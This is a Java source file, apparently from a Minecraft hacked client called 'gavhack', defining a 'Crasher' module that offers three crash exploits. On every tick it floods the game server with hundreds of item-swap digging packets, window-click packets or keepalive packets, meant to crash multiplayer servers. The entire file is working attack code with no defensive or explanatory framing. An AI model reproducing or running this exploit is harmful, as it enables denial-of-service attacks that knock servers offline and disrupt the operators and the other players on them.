package dev.gavhack.module.mods;

import dev.gavhack.events.PlayerUpdateEvent;
import dev.gavhack.module.Category;
import dev.gavhack.module.Module;
import dev.gavhack.settings.EnumSetting;
import dev.gavhack.settings.FloatSetting;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketKeepAlive;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class Crasher extends Module {

    private final EnumSetting<CrashMode> crashMode = new EnumSetting<>("Mode", CrashMode.Offhand);
    private final FloatSetting offhandSpeed = new FloatSetting("OffhandSpeed", 500.0f, 0.0f, 1000.0f);

    public Crasher() {
        super("Crasher", "Various crash exploits", Category.OTHER);
    }

    @SubscribeEvent
    public void onTick(PlayerUpdateEvent event) {
        if (crashMode.getValue() == CrashMode.Offhand) {
            for (int i = 0; i < this.offhandSpeed.getValue(); ++i) {
                final BlockPos playerBlock = new BlockPos(mc.player.posX, mc.player.posY - 1.0, mc.player.posZ);
                mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
            }
        } else if (crashMode.getValue() == CrashMode.Taco) {
            for (int i = 0; i < 1000; i++) {
                final ItemStack item = new ItemStack(mc.player.getHeldItemMainhand().getItem());
                final CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short)1);
                mc.player.connection.sendPacket(packet);
            }
        } else {
            for (int i = 0; i < 5; i++) {
                mc.player.connection.sendPacket(new CPacketKeepAlive());
            }
        }
    }

    private enum CrashMode {
        Offhand,
        Taco,
        Spam
    }
}
